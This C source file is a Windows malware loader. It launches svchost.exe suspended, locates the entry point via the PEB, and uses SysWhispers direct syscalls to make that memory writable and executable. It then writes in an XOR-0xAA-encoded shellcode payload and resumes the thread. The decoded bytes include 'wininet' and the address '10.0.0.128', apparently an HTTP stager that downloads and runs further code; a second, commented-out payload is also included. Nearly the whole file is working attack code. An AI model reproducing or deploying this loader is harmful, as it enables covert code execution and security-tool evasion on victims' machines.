#include "typedef.h"
#include "Syswhispers.h"

typedef struct _Syscalls {
    NtWriteVirtualMemoryPtr myNtWriteVirtualMemory;
    NtAllocateVirtualMemoryPtr myNtAllocateVirtualMemory;
    NtProtectVirtualMemoryPtr myNtProtectVirtualMemory;
    NtQueryProcessInformationPtr myNtQueryProcessInformation;
    NtReadVirtualMemoryPtr myNtReadVirtualMemory;
}Syscalls, * PSyscalls;

BOOL populateStruct(OUT PSyscalls syscalls) {

    // HMODULE  = GetModuleHandleA("NTDLL.DLL");
    HMODULE hNTDLL = LoadLibraryA("NTDLL.DLL");
    syscalls->myNtWriteVirtualMemory = (NtWriteVirtualMemoryPtr)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    syscalls->myNtAllocateVirtualMemory = (NtAllocateVirtualMemoryPtr)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    syscalls->myNtProtectVirtualMemory = (NtProtectVirtualMemoryPtr)GetProcAddress(hNTDLL, "NtProtectVirtualMemory");
    syscalls->myNtQueryProcessInformation = (NtQueryProcessInformationPtr)GetProcAddress(hNTDLL, "NtQueryInformationProcess");
    syscalls->myNtReadVirtualMemory = (NtReadVirtualMemoryPtr)GetProcAddress(hNTDLL, "NtReadVirtualMemory");
    //NtResumeProcess -> ADD
    if (syscalls->myNtQueryProcessInformation == NULL || syscalls->myNtAllocateVirtualMemory == NULL || syscalls->myNtProtectVirtualMemory == NULL || syscalls->myNtReadVirtualMemory == NULL || syscalls->myNtWriteVirtualMemory == NULL) {
        printf("Error populating syscall struct\n");
        return FALSE;
    }
    else {
        return TRUE;
    }
}

void printByteArray(const unsigned char* array, size_t size) {
    printf("Contents of the byte array:\n");
    for (size_t i = 0; i < size; ++i) {
        printf("%02X ", array[i]); // Print each byte in hexadecimal format
    }
    printf("\n", array);
}

BOOL hollowProcess(PROCESS_INFORMATION Pi, IN PVOID pPayload, SIZE_T sPayload) {
    Syscalls syscalls = { 0 };
    printf("Size payload: %d\n", sPayload);

    if (!populateStruct(&syscalls)) {
        return FALSE;
    }


    //Now that we have the query process ifnormation syscall we can find the entry point of the process handle being passed
    //to do this we first find the PEB then using offsets calculate the entry point

    //step 1. find the PEB
    //  _Out_     PVOID            ProcessInformation,

    PROCESS_BASIC_INFORMATION basicInformation = { 0 };
    printf("PROCESS ID: %d\n\n", Pi.dwProcessId);
    //ProcessBasicInformaiton is a flag defined in the docs to retreive a pointer to ProcessBasicInformation struct when set to ProcessBasicInformation.
    
    syscalls.myNtQueryProcessInformation(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);



    //syscalls.myNtQueryProcessInformation(Pi.hProcess,ProcessBasicInformation)
    printf("PEB: 0x%p\n", basicInformation.PebBaseAddress);

    //Now with PEB get offsets to image entry point 

    uintptr_t BaseAddress = (uintptr_t)basicInformation.PebBaseAddress + 0x10;//
    BYTE procAddr[64];
    BYTE dataBuff[0x200];
    SIZE_T bytesRW = 0;
    // THis 64 is based on the architecture used...
    
    //BOOL result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
    BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);

    uintptr_t executableAddress = *((uintptr_t*)procAddr);//
    
    //result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
    result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), & bytesRW);

    unsigned int e_lfanew = *((unsigned int*)(dataBuff + 0x3c));
    unsigned int rvaOffset = e_lfanew + 0x28;

    unsigned int rva = *((unsigned int*)(dataBuff + rvaOffset));

    uintptr_t entrypointAddr = executableAddress + rva;
    PVOID test = (PVOID)entrypointAddr;
    ULONG sizer = sPayload;
    DWORD oldPerm = PAGE_EXECUTE_READWRITE;

    printf("Entrypoint: 0x%lp\n", test);
    printf("Size payload: %d", sPayload);

    PVOID sizeTest = (PVOID)sPayload;

    //BOOL results = syscalls.myNtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
    result = Sw3NtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
    
    
    //    BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);
    //BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);

    printf("Address of optional header offset: 0x%p\n", e_lfanew);
    printf("Address of entrypoint rva offset: 0x%p\n", rvaOffset);
    printf("Executable ADDR: 0x%lp\n", executableAddress);
    printf("Entrypoint ADDR: 0x%lp\n", test);
    printf("Entrypoint: 0x%lp\n", entrypointAddr);
    printf("Change Perms: %X\n", result);
    getchar();



    printf("\nentrypoint: 0x%p\n", entrypointAddr);
    printf("pvoid entrypoint pvoid: 0x%p\n", (PVOID)entrypointAddr);
    printf("(PVOID)Test pvoid: 0x%p\n", (PVOID)test);
    printf("&Test pvoid : 0x % p\n", &test);
    printf("Test : 0x%p\n", test);



    getchar();
    ULONG read = 0;
    
    //BOOL bruh = syscalls.myNtWriteVirtualMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
    BOOL bruh = Sw3NtWriteVirtualMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
   // St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)
    //WriteProcessMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);


    //if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {

    //results = syscalls.myNtWriteVirtualMemory(Pi.hProcess, (LPVOID)entrypointAddr, truePayload, sizeof(truePayload), &numBytesWritten);
    //results =  (Pi.hProcess, (LPVOID)test, truePayload, sizeof(truePayload), &bytesRW);
    printf("WRote @ Address of entrypoint offset: 0x%p\n", test);
    getchar();
    
    //ResumeThread(Pi.hThread);
    PULONG suspendCount;
    Sw3NtResumeThread(Pi.hThread, &suspendCount);
}

int main() {


    STARTUPINFOA Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };
    BOOL success = FALSE;
    success = CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL,
        NULL, //p handle cannot be inheritied by child process
        NULL, //thread handle cannot be inheritied yb child since NULL
        PROCESS_ALL_ACCESS,
        CREATE_SUSPENDED,
        NULL, //use def environmen vars
        NULL, //inherit current dir as parent.
        &Si,
        &Pi
    );

    //BYTE buf[761] = { 0x56, 0xE2, 0x29, 0x4E, 0x5A, 0x42, 0x66, 0xAA, 0xAA, 0xAA, 0xEB, 0xFB, 0xEB, 0xFA, 0xF8, 0xFB, 0xE2, 0x9B, 0x78, 0xFC, 0xCF, 0xE2, 0x21, 0xF8, 0xCA, 0xE2, 0x21, 0xF8, 0xB2, 0xE2, 0x21, 0xF8, 0x8A, 0xE7, 0x9B, 0x63, 0xE2, 0x21, 0xD8, 0xFA, 0xE2, 0xA5, 0x1D, 0xE0, 0xE0, 0xE2, 0x9B, 0x6A, 0x06, 0x96, 0xCB, 0xD6, 0xA8, 0x86, 0x8A, 0xEB, 0x6B, 0x63, 0xA7, 0xEB, 0xAB, 0x6B, 0x48, 0x47, 0xF8, 0xEB, 0xFB, 0xE2, 0x21, 0xF8, 0x8A, 0x21, 0xE8, 0x96, 0xE2, 0xAB, 0x7A, 0xCC, 0x2B, 0xD2, 0xB2, 0xA1, 0xA8, 0xA5, 0x2F, 0xD8, 0xAA, 0xAA, 0xAA, 0x21, 0x2A, 0x22, 0xAA, 0xAA, 0xAA, 0xE2, 0x2F, 0x6A, 0xDE, 0xCD, 0xE2, 0xAB, 0x7A, 0x21, 0xE2, 0xB2, 0xEE, 0x21, 0xEA, 0x8A, 0xFA, 0xE3, 0xAB, 0x7A, 0x49, 0xFC, 0xE7, 0x9B, 0x63, 0xE2, 0x55, 0x63, 0xEB, 0x21, 0x9E, 0x22, 0xE2, 0xAB, 0x7C, 0xE2, 0x9B, 0x6A, 0x06, 0xEB, 0x6B, 0x63, 0xA7, 0xEB, 0xAB, 0x6B, 0x92, 0x4A, 0xDF, 0x5B, 0xE6, 0xA9, 0xE6, 0x8E, 0xA2, 0xEF, 0x93, 0x7B, 0xDF, 0x72, 0xF2, 0xEE, 0x21, 0xEA, 0x8E, 0xE3, 0xAB, 0x7A, 0xCC, 0xEB, 0x21, 0xA6, 0xE2, 0xEE, 0x21, 0xEA, 0xB6, 0xE3, 0xAB, 0x7A, 0xEB, 0x21, 0xAE, 0x22, 0xEB, 0xF2, 0xE2, 0xAB, 0x7A, 0xEB, 0xF2, 0xF4, 0xF3, 0xF0, 0xEB, 0xF2, 0xEB, 0xF3, 0xEB, 0xF0, 0xE2, 0x29, 0x46, 0x8A, 0xEB, 0xF8, 0x55, 0x4A, 0xF2, 0xEB, 0xF3, 0xF0, 0xE2, 0x21, 0xB8, 0x43, 0xE1, 0x55, 0x55, 0x55, 0xF7, 0xE2, 0x9B, 0x71, 0xF9, 0xE3, 0x14, 0xDD, 0xC3, 0xC4, 0xC3, 0xC4, 0xCF, 0xDE, 0xAA, 0xEB, 0xFC, 0xE2, 0x23, 0x4B, 0xE3, 0x6D, 0x68, 0xE6, 0xDD, 0x8C, 0xAD, 0x55, 0x7F, 0xF9, 0xF9, 0xE2, 0x23, 0x4B, 0xF9, 0xF0, 0xE7, 0x9B, 0x6A, 0xE7, 0x9B, 0x63, 0xF9, 0xF9, 0xE3, 0x10, 0x90, 0xFC, 0xD3, 0x0D, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0x42, 0xA6, 0xAA, 0xAA, 0xAA, 0x9B, 0x9D, 0x98, 0x84, 0x98, 0x9A, 0x84, 0x9B, 0x9A, 0x84, 0x98, 0xAA, 0xF0, 0xE2, 0x23, 0x6B, 0xE3, 0x6D, 0x6A, 0x11, 0xAB, 0xAA, 0xAA, 0xE7, 0x9B, 0x63, 0xF9, 0xF9, 0xC0, 0xA9, 0xF9, 0xE3, 0x10, 0xFD, 0x23, 0x35, 0x6C, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0x42, 0x7B, 0xAA, 0xAA, 0xAA, 0x85, 0xF9, 0xFD, 0xC8, 0xE2, 0xEF, 0xEB, 0xC5, 0x9E, 0x87, 0xD9, 0xD9, 0xCF, 0xF0, 0xC2, 0x93, 0xC1, 0xCF, 0xE9, 0xE4, 0xFC, 0x87, 0xCD, 0xE6, 0xC4, 0x99, 0xCB, 0xFC, 0xDB, 0xC3, 0x9C, 0xE2, 0xCC, 0xEE, 0xC3, 0xDA, 0xC8, 0xC3, 0xF2, 0xC6, 0xE9, 0xCE, 0xCF, 0x87, 0xCF, 0xC5, 0xFA, 0x98, 0xE8, 0xEE, 0xF0, 0x9F, 0xDF, 0xE5, 0xC1, 0x87, 0xE7, 0x93, 0xFF, 0xDE, 0xEC, 0xC2, 0xED, 0xD0, 0xE3, 0xC4, 0xDE, 0x9C, 0xE0, 0xEF, 0x9C, 0xDE, 0xCD, 0xDF, 0xE5, 0x93, 0xE2, 0xCF, 0xCE, 0xDF, 0xC3, 0x9C, 0xE7, 0xFD, 0xCF, 0xD0, 0xD9, 0xFB, 0xC2, 0xDF, 0xC4, 0xDA, 0xDE, 0x9A, 0xEC, 0xDE, 0xFE, 0x9B, 0xF0, 0xC0, 0xD2, 0xD8, 0xFB, 0x9F, 0xFA, 0xE7, 0xDD, 0xD0, 0xEE, 0x9F, 0x87, 0xC5, 0x93, 0x93, 0xE0, 0xF3, 0xD8, 0xCD, 0xCF, 0xED, 0xC7, 0xC2, 0xCF, 0xC9, 0xC6, 0xDD, 0xC3, 0xE5, 0xED, 0xCB, 0x9D, 0x9E, 0xDD, 0xC1, 0xFB, 0xF8, 0xE5, 0x99, 0xEC, 0xD3, 0x9A, 0x98, 0xDC, 0xC0, 0x9A, 0x92, 0xE4, 0xDD, 0xDF, 0x98, 0xF8, 0xC9, 0xC7, 0xDA, 0x9B, 0xC4, 0xC7, 0xF0, 0xFB, 0xCC, 0xC5, 0x98, 0xC2, 0xD9, 0xCF, 0xE9, 0x92, 0x9B, 0xCC, 0xCE, 0xDF, 0xE7, 0x9A, 0xFA, 0xD2, 0xC3, 0xC7, 0xE8, 0xC2, 0xD0, 0x93, 0xDB, 0xDF, 0xD0, 0xE2, 0xC7, 0xC0, 0xE1, 0xEF, 0xC6, 0xE2, 0xD2, 0xCE, 0xCF, 0x9C, 0xFE, 0x9F, 0x9F, 0xC8, 0xFE, 0xD2, 0xF5, 0xFF, 0xEF, 0xCF, 0xDA, 0xCB, 0xC7, 0xAA, 0xE2, 0x23, 0x6B, 0xF9, 0xF0, 0xEB, 0xF2, 0xE7, 0x9B, 0x63, 0xF9, 0xE2, 0x12, 0xAA, 0x98, 0x02, 0x2E, 0xAA, 0xAA, 0xAA, 0xAA, 0xFA, 0xF9, 0xF9, 0xE3, 0x6D, 0x68, 0x41, 0xFF, 0x84, 0x91, 0x55, 0x7F, 0xE2, 0x23, 0x6C, 0xC0, 0xA0, 0xF5, 0xE2, 0x23, 0x5B, 0xC0, 0xB5, 0xF0, 0xF8, 0xC2, 0x2A, 0x99, 0xAA, 0xAA, 0xE3, 0x23, 0x4A, 0xC0, 0xAE, 0xEB, 0xF3, 0xE3, 0x10, 0xDF, 0xEC, 0x34, 0x2C, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE7, 0x9B, 0x6A, 0xF9, 0xF0, 0xE2, 0x23, 0x5B, 0xE7, 0x9B, 0x63, 0xE7, 0x9B, 0x63, 0xF9, 0xF9, 0xE3, 0x6D, 0x68, 0x87, 0xAC, 0xB2, 0xD1, 0x55, 0x7F, 0x2F, 0x6A, 0xDF, 0xB5, 0xE2, 0x6D, 0x6B, 0x22, 0xB9, 0xAA, 0xAA, 0xE3, 0x10, 0xEE, 0x5A, 0x9F, 0x4A, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE2, 0x55, 0x65, 0xDE, 0xA8, 0x41, 0x00, 0x42, 0xFF, 0xAA, 0xAA, 0xAA, 0xF9, 0xF3, 0xC0, 0xEA, 0xF0, 0xE3, 0x23, 0x7B, 0x6B, 0x48, 0xBA, 0xE3, 0x6D, 0x6A, 0xAA, 0xBA, 0xAA, 0xAA, 0xE3, 0x10, 0xF2, 0x0E, 0xF9, 0x4F, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE2, 0x39, 0xF9, 0xF9, 0xE2, 0x23, 0x4D, 0xE2, 0x23, 0x5B, 0xE2, 0x23, 0x70, 0xE3, 0x6D, 0x6A, 0xAA, 0x8A, 0xAA, 0xAA, 0xE3, 0x23, 0x53, 0xE3, 0x10, 0xB8, 0x3C, 0x23, 0x48, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE2, 0x29, 0x6E, 0x8A, 0x2F, 0x6A, 0xDE, 0x18, 0xCC, 0x21, 0xAD, 0xE2, 0xAB, 0x69, 0x2F, 0x6A, 0xDF, 0x78, 0xF2, 0x69, 0xF2, 0xC0, 0xAA, 0xF3, 0x11, 0x4A, 0xB7, 0x80, 0xA0, 0xEB, 0x23, 0x70, 0x55, 0x7F };
    BYTE buf[593] = { 0x56, 0xE2, 0x29, 0x4E, 0x5A, 0x42, 0x66, 0xAA, 0xAA, 0xAA, 0xEB, 0xFB, 0xEB, 0xFA, 0xF8, 0xFB, 0xE2, 0x9B, 0x78, 0xFC, 0xCF, 0xE2, 0x21, 0xF8, 0xCA, 0xE2, 0x21, 0xF8, 0xB2, 0xE2, 0x21, 0xF8, 0x8A, 0xE2, 0x21, 0xD8, 0xFA, 0xE2, 0xA5, 0x1D, 0xE0, 0xE0, 0xE7, 0x9B, 0x63, 0xE2, 0x9B, 0x6A, 0x06, 0x96, 0xCB, 0xD6, 0xA8, 0x86, 0x8A, 0xEB, 0x6B, 0x63, 0xA7, 0xEB, 0xAB, 0x6B, 0x48, 0x47, 0xF8, 0xEB, 0xFB, 0xE2, 0x21, 0xF8, 0x8A, 0x21, 0xE8, 0x96, 0xE2, 0xAB, 0x7A, 0xCC, 0x2B, 0xD2, 0xB2, 0xA1, 0xA8, 0xA5, 0x2F, 0xD8, 0xAA, 0xAA, 0xAA, 0x21, 0x2A, 0x22, 0xAA, 0xAA, 0xAA, 0xE2, 0x2F, 0x6A, 0xDE, 0xCD, 0xE2, 0xAB, 0x7A, 0xFA, 0x21, 0xE2, 0xB2, 0xEE, 0x21, 0xEA, 0x8A, 0xE3, 0xAB, 0x7A, 0x49, 0xFC, 0xE2, 0x55, 0x63, 0xEB, 0x21, 0x9E, 0x22, 0xE7, 0x9B, 0x63, 0xE2, 0xAB, 0x7C, 0xE2, 0x9B, 0x6A, 0xEB, 0x6B, 0x63, 0xA7, 0x06, 0xEB, 0xAB, 0x6B, 0x92, 0x4A, 0xDF, 0x5B, 0xE6, 0xA9, 0xE6, 0x8E, 0xA2, 0xEF, 0x93, 0x7B, 0xDF, 0x72, 0xF2, 0xEE, 0x21, 0xEA, 0x8E, 0xE3, 0xAB, 0x7A, 0xCC, 0xEB, 0x21, 0xA6, 0xE2, 0xEE, 0x21, 0xEA, 0xB6, 0xE3, 0xAB, 0x7A, 0xEB, 0x21, 0xAE, 0x22, 0xE2, 0xAB, 0x7A, 0xEB, 0xF2, 0xEB, 0xF2, 0xF4, 0xF3, 0xF0, 0xEB, 0xF2, 0xEB, 0xF3, 0xEB, 0xF0, 0xE2, 0x29, 0x46, 0x8A, 0xEB, 0xF8, 0x55, 0x4A, 0xF2, 0xEB, 0xF3, 0xF0, 0xE2, 0x21, 0xB8, 0x43, 0xE1, 0x55, 0x55, 0x55, 0xF7, 0xE2, 0x9B, 0x71, 0xF9, 0xE3, 0x14, 0xDD, 0xC3, 0xC4, 0xC3, 0xC4, 0xCF, 0xDE, 0xAA, 0xEB, 0xFC, 0xE2, 0x23, 0x4B, 0xE3, 0x6D, 0x68, 0xE6, 0xDD, 0x8C, 0xAD, 0x55, 0x7F, 0xF9, 0xF9, 0xE2, 0x23, 0x4B, 0xF9, 0xF0, 0xE7, 0x9B, 0x6A, 0xE7, 0x9B, 0x63, 0xF9, 0xF9, 0xE3, 0x10, 0x90, 0xFC, 0xD3, 0x0D, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0x42, 0xA1, 0xAA, 0xAA, 0xAA, 0x9B, 0x9A, 0x84, 0x9A, 0x84, 0x9A, 0x84, 0x9B, 0x98, 0x92, 0xAA, 0xF0, 0xE2, 0x23, 0x6B, 0xE3, 0x6D, 0x6A, 0x11, 0xAB, 0xAA, 0xAA, 0xE7, 0x9B, 0x63, 0xF9, 0xF9, 0xC0, 0xA9, 0xF9, 0xE3, 0x10, 0xFD, 0x23, 0x35, 0x6C, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0x42, 0x80, 0xAA, 0xAA, 0xAA, 0x85, 0xE0, 0xC6, 0xDA, 0xFF, 0x9F, 0xFC, 0xE9, 0xE8, 0xDF, 0xC7, 0xF3, 0xFD, 0xDD, 0xF8, 0xCC, 0xEE, 0xC9, 0xFA, 0x92, 0xC0, 0xF9, 0xCD, 0xC3, 0xF8, 0xC9, 0xC9, 0xDA, 0xC1, 0xE6, 0xEB, 0xDC, 0xF9, 0xCD, 0xE4, 0xEF, 0xD9, 0xD0, 0xDC, 0xCD, 0xED, 0xAA, 0xE2, 0x23, 0x6B, 0xF9, 0xF0, 0xEB, 0xF2, 0xE7, 0x9B, 0x63, 0xF9, 0xE2, 0x12, 0xAA, 0x98, 0x02, 0x2E, 0xAA, 0xAA, 0xAA, 0xAA, 0xFA, 0xF9, 0xF9, 0xE3, 0x6D, 0x68, 0x41, 0xFF, 0x84, 0x91, 0x55, 0x7F, 0xE2, 0x23, 0x6C, 0xC0, 0xA0, 0xF5, 0xE2, 0x23, 0x5B, 0xC0, 0xB5, 0xF0, 0xF8, 0xC2, 0x2A, 0x99, 0xAA, 0xAA, 0xE3, 0x23, 0x4A, 0xC0, 0xAE, 0xEB, 0xF3, 0xE3, 0x10, 0xDF, 0xEC, 0x34, 0x2C, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE7, 0x9B, 0x6A, 0xF9, 0xF0, 0xE2, 0x23, 0x5B, 0xE7, 0x9B, 0x63, 0xE7, 0x9B, 0x63, 0xF9, 0xF9, 0xE3, 0x6D, 0x68, 0x87, 0xAC, 0xB2, 0xD1, 0x55, 0x7F, 0x2F, 0x6A, 0xDF, 0xB5, 0xE2, 0x6D, 0x6B, 0x22, 0xB9, 0xAA, 0xAA, 0xE3, 0x10, 0xEE, 0x5A, 0x9F, 0x4A, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE2, 0x55, 0x65, 0xDE, 0xA8, 0x41, 0x00, 0x42, 0xFF, 0xAA, 0xAA, 0xAA, 0xF9, 0xF3, 0xC0, 0xEA, 0xF0, 0xE3, 0x23, 0x7B, 0x6B, 0x48, 0xBA, 0xE3, 0x6D, 0x6A, 0xAA, 0xBA, 0xAA, 0xAA, 0xE3, 0x10, 0xF2, 0x0E, 0xF9, 0x4F, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE2, 0x39, 0xF9, 0xF9, 0xE2, 0x23, 0x4D, 0xE2, 0x23, 0x5B, 0xE2, 0x23, 0x70, 0xE3, 0x6D, 0x6A, 0xAA, 0x8A, 0xAA, 0xAA, 0xE3, 0x23, 0x53, 0xE3, 0x10, 0xB8, 0x3C, 0x23, 0x48, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE2, 0x29, 0x6E, 0x8A, 0x2F, 0x6A, 0xDE, 0x18, 0xCC, 0x21, 0xAD, 0xE2, 0xAB, 0x69, 0x2F, 0x6A, 0xDF, 0x78, 0xF2, 0x69, 0xF2, 0xC0, 0xAA, 0xF3, 0x11, 0x4A, 0xB7, 0x80, 0xA0, 0xEB, 0x23, 0x70, 0x55, 0x7F };
    BYTE truePayload[sizeof(buf)];
    printByteArray(buf, sizeof(buf));
    printByteArray(buf, sizeof(truePayload));
    for (int i = 0; i < sizeof(buf); i++) {
        truePayload[i] = (BYTE)(((DWORD)buf[i] ^ 0xAA) & 0xFF);
    }
    printByteArray(truePayload, sizeof(buf));
    hollowProcess(Pi,(PVOID)truePayload,sizeof(truePayload));
    return 0;
}
